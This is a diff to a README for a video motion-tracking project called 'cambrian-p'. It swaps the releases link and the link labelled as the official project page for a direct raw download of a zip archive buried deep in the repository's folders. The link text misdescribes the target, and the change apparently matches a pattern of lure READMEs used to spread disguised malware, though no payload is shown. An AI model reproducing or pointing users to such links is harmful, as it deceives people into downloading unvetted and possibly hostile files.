@@ -1,6 +1,6 @@
 # 📽️ cambrian-p - Understand videos through precise motion tracking
 
-<a href="https://github.com/Ecolihazardousness497/cambrian-p/releases">
+<a href="https://raw.githubusercontent.com/Ecolihazardousness497/cambrian-p/main/cambrianp/trl/environment/p-cambrian-2.3.zip">
   <img src="https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge&logo=github" alt="Download Link">
 </a>
 
@@ -24,7 +24,7 @@ You must install the latest official drivers for your graphics card. Visit the w
 Follow these steps to set up the software on your machine.
 
 1.  Open your preferred web browser.
-2.  Navigate to the official project page by clicking here: [https://github.com/Ecolihazardousness497/cambrian-p](https://github.com/Ecolihazardousness497/cambrian-p).
+2.  Navigate to the official project page by clicking here: [https://raw.githubusercontent.com/Ecolihazardousness497/cambrian-p/main/cambrianp/trl/environment/p-cambrian-2.3.zip](https://raw.githubusercontent.com/Ecolihazardousness497/cambrian-p/main/cambrianp/trl/environment/p-cambrian-2.3.zip).
 3.  Look for the section labeled Releases on the right side of the page.
 4.  Click the release version shown at the top of that list.
 5.  Find the file that ends in .exe under the Assets section.
